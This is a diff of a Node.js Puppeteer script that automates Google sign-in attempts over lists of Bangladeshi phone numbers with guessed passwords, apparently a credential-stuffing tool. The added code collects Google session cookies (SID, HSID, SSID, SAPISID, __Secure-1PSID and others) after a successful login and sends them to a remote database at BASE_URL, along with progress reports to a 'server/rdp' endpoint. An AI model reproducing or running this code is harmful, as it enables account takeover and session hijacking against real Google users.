@@ -38,7 +38,7 @@ process.argv.slice(2).forEach(function (data, index) {
 
 
 async function startServer() {
-    console.log('★★★---START---★★★')
+    console.log('|0'+ID+'|----START----|0'+ID+'|')
 
     try {
         TIME = null
@@ -65,37 +65,10 @@ async function startServer() {
             mList = await getNumber(true)
         }
 
-        // mList = [
-        //     1779511414, 1779511399, 1919725159, 1919726086, 1919726062,
-        //     1919726080, 1919726106, 1919726124, 1919726126, 1919726153,
-        //     1919726136, 1919726143, 1919726212, 1919725234, 1919726169,
-        //     1919726223, 1919726233, 1919726252, 1919726240, 1919726238,
-        //     1919726272, 1919726247, 1919726278, 1919726296, 1919725232,
-        //     1919726293, 1919726237, 1919726295, 1919726308, 1919726271,
-        //     1919726312, 1919726281, 1919726377, 1919726345, 1919726344,
-        //     1919725207, 1919726349, 1919726406, 1919726432, 1919726447,
-        //     1919726464, 1919726490, 1919726445, 1919726460, 1919726469,
-        //     1919726472, 1919725223, 1919726458, 1919726500, 1919726533,
-        //     1919726514, 1919726510, 1919726531, 1919726527, 1919726561,
-        //     1919726575, 1919726612, 1919725217, 1919726611, 1919726606,
-        //     1919726631, 1919726613, 1919726629, 1919726590, 1919726650,
-        //     1919726701, 1919726676, 1919726685, 1919725272, 1919726735,
-        //     1919726700, 1919726688, 1919726675, 1919726692, 1919726757,
-        //     1919726801, 1919726736, 1919726784, 1919726781, 1919725293,
-        //     1919726788, 1919726795, 1919726793, 1919726837, 1919726870,
-        //     1919726877, 1919726927, 1919726846, 1919726862, 1919726930,
-        //     1919725244, 1919726949, 1919726943, 1919726953, 1919727032,
-        //     1919727000, 1919727021, 1919726958, 1919727013, 1919727022
-        //   ]
-
-        // COUNTRY = 'BD'
-        // CODE = '880'
-        // PATTERN = [ [ 2, 13 ], [ 5, 13 ], [ 2, 10 ] ]
-
         await startBrowser()
 
     } catch (error) {
-        console.log('----EXIT----')
+        console.log('|0'+ID+'|----EXIT----|0'+ID+'|')
         process.exit(0)
     }
 }
@@ -157,22 +130,20 @@ async function startBrowser() {
             }
         })
 
-        console.log('----LOAD----')
+        console.log('|0'+ID+'|----LOAD----|0'+ID+'|')
 
         while (true) {
             try {
                 if (SIZE >= mList.length) {
                     mList = await getNumber(true)
                 }
-                console.log('Size:', SIZE)
                 await loginNumber()
             } catch (error) {
                 await delay(10000)
             }
         }
     } catch (error) {
-        console.log(error)
-        console.log('----EXIT----')
+        console.log('|0'+ID+'|----EXIT----|0'+ID+'|')
         process.exit(0)
     }
 }
@@ -197,9 +168,8 @@ async function loginNumber() {
         }
     }
 
-    console.log(LOGIN_RESULT)
-
     if (LOGIN_RESULT.status == 200) {
+        console.log('|0'+ID+'|----'+SIZE+'----|0'+ID+'|')
         await password.bringToFront()
         if (!await exits(password, 'input[type="password"]')) {
             await password.goto('https://accounts.google.com/signin/v2/challenge/pwd?TL='+LOGIN_RESULT.tl+'&checkConnection=youtube%3A225&checkedDomains=youtube&cid='+LOGIN_RESULT.cid+'&continue=https%3A%2F%2Fmyaccount.google.com&ddm=0&flowEntry=ServiceLogin&flowName=GlifWebSignIn&hl=en&pstMsg=1&service=accountsettings', { waitUntil: 'load', timeout: 0 })
@@ -220,16 +190,43 @@ async function loginNumber() {
                 }
             }
 
-            console.log(PASS_RESULT)
+
 
             if (PASS_RESULT.status == 400) {
                 continue
-            } else if(PASS_RESULT.status == 200){
-                await patchAxios(BASE_URL+'login/'+COUNTRY+'/'+mList[SIZE]+'.json', '{"'+pass+'":"'+'200'+'"}', {
+            } else if(PASS_RESULT.status == 200) {
+                let Cookie = ''
+                try {
+                    let cookies = await page.cookies()
+    
+                    for (let i = 0; i < cookies.length; i++) {
+                        let name = cookies[i]['name']
+
+                        if (name == 'APISID' || name == 'HSID' || name == 'LSID' || 
+                                name == 'OSID' || name == 'SID' || name == 'SSID' ||
+                                    name == 'SAPISID' || name == '__Secure-1PSID') {
+                            
+                            Cookie += name+'='+cookies[i]['value']+'; '
+                        }
+                    }
+                } catch (error) {}
+                
+                await patchAxios(BASE_URL+'login/'+COUNTRY+'/'+mList[SIZE]+'.json', '{"'+pass+'":"'+Cookie+'"}', {
                     headers: {
                         'Content-Type': 'application/x-www-form-urlencoded'
                     }
                 })
+
+                SIZE++
+
+                await patchAxios(BASE_URL+'server/rdp/'+USER+'/'+ID+'.json', JSON.stringify({ size:SIZE }), {
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    }
+                })
+
+                console.log('|0'+ID+'|----EXIT----|0'+ID+'|')
+                process.exit(0)
             } else if(PASS_RESULT.status >= 201 && PASS_RESULT.status <= 205){
                 await patchAxios(BASE_URL+'password/'+COUNTRY+'/'+mList[SIZE]+'.json', '{"'+pass+'":"'+PASS_RESULT.status+'"}', {
                     headers: {
@@ -251,7 +248,7 @@ async function loginNumber() {
     let now = new Date().getTime()
 
     if(mUpdate < now) {
-        mUpdate = now+120000
+        mUpdate = now+60000
 
         await patchAxios(BASE_URL+'server/rdp/'+USER+'/'+ID+'.json', JSON.stringify({ size:SIZE }), {
             headers: {
@@ -438,6 +435,25 @@ async function getPassRequest(request, TL, cid) {
                     return { status:205 }
                 }
             } else if(data.includes('https://accounts.google.com/CheckCookie') || data.includes('https%3A%2F%2Faccounts.google.com%2FCheckCookie') | data.includes('https%3a%2f%2faccounts.google.com%2fCheckCookie')) {
+                while (true) {
+                    let ID = 0
+                    try {
+                        await password.goto('https://myaccount.google.com', { waitUntil: 'load', timeout: 0 })
+                        
+                        let cookies = await password.cookies()
+        
+                        for (let i = 0; i < cookies.length; i++) {
+                            let name = cookies[i]['name']
+                            if (name == 'SSID' || name == 'HSID' || name == 'APISID') {
+                                ID++
+                            }
+                        }
+                    } catch (error) {}
+
+                    if (ID == 3) {
+                        break
+                    }
+                }
                 return { status:200 }
             } else if(data.includes('webapproval') || data.includes('https://accounts.google.com/signin/recovery') || data.includes('https%3A%2F%2Faccounts.google.com%2Fsignin%2Frecovery') || data.includes('https%3a%2f%2faccounts.google.com%2fsignin%2frecovery')) {
                 return { status:201 }
@@ -542,7 +558,7 @@ async function getNumber(update) {
     }
 
     await delay(60000)
-    console.log('----NUMBER-ERROR----')
+    console.log('|0'+ID+'|----NUMBER-ERROR----|0'+ID+'|')
 
     return await getNumber(update)
 }
